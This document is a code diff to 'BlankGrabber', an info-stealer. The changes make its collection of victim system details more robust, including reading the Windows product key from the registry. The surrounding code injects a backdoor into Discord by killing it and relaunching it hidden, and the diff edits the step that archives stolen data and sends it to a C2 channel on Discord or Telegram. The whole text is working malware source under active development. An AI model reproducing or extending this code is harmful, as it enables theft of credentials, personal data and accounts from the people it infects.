@@ -1457,16 +1457,15 @@ class BlankGrabber:
                 Logger.info("Injecting backdoor into discord")
                 for dir in paths:
                     appname = os.path.basename(dir)
-                    killTask = Utility.TaskKill(appname)
-                    if killTask.returncode == 0:
-                        for root, _, files in os.walk(dir):
-                            for file in files:
-                                if file.lower() == appname.lower() + '.exe':
-                                    time.sleep(3)
-                                    filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
-                                    UpdateEXE = os.path.join(dir, 'Update.exe')
-                                    DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
-                                    subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+                    Utility.TaskKill(appname)
+                    for root, _, files in os.walk(dir):
+                        for file in files:
+                            if file.lower() == appname.lower() + '.exe':
+                                time.sleep(3)
+                                filepath = os.path.dirname(os.path.realpath(os.path.join(root, file)))
+                                UpdateEXE = os.path.join(dir, 'Update.exe')
+                                DiscordEXE = os.path.join(filepath, '{}.exe'.format(appname))
+                                subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     def CreateArchive(self) -> tuple[str, str | None]: # Create archive of the data collected
         Logger.info("Creating archive")
@@ -1523,13 +1522,23 @@ class BlankGrabber:
 
         if os.path.isfile(self.ArchivePath):
             Logger.info("Sending data to C2")
-            computerName = os.getenv("computername")
-            computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
-            totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
-            uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
-            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
-            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
-            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
+            computerName = os.getenv("computername") or "Unable to get computer name"
+            
+            computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()
+            computerOS = computerOS[2].strip() if len(computerOS) >= 2 else "Unable to detect OS"
+
+            totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
+            totalMemory = (str(int(int(totalMemory[1])/1000000000)) + " GB") if len(totalMemory) >= 1 else "Unable to detect total memory"
+
+            uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()
+            uuid = uuid[1].strip() if len(uuid) >= 1 else "Unable to detect UUID"
+
+            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to detect CPU"
+
+            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()
+            gpu = gpu[2].strip() if len(gpu) >= 2 else "Unable to detect GPU"
+
+            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip() or "Unable to get product key"
 
             http = PoolManager(cert_reqs="CERT_NONE")
 
@@ -1619,7 +1628,6 @@ class BlankGrabber:
                     payload_discord['content'] += ' | Archive : {}'.format(url)
                 elif Settings.C2[0] == 1:
                     payload_telegram['caption'] += '\n\nArchive : {}'.format(url)
-
         
             if Settings.C2[0] == 0:
                 fields['payload_json'] = json.dumps(payload_discord).encode()
